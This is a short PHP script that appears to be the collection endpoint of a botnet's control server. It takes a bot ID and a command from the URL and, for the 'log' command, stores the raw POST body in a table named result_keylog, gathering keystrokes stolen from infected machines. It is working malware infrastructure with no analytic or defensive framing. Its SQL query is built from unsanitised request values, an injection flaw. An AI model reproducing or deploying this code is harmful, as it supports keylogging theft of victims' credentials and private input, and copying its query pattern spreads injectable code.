<?php
	include "db.php";
	if(isset($_GET["bot_id"]))
	{
		$bot_id = $_GET["bot_id"];
		if(isset($_GET["cmd"])){
			$cmd = $_GET["cmd"];
			//echo $cmd."\r\n";
			$post_data = file_get_contents("php://input");
			//echo "postdata: ".$post_data;
			if($cmd === "log"){
				//echo "keylog insert";
				$sql = "INSERT INTO `result_keylog` (`bot_id`,`content`) values ('".$bot_id."','".$post_data."')";
				$result = $conn->query($sql);
				//echo "keylog insert done";
			}
		}
	}
	$conn->close();
?>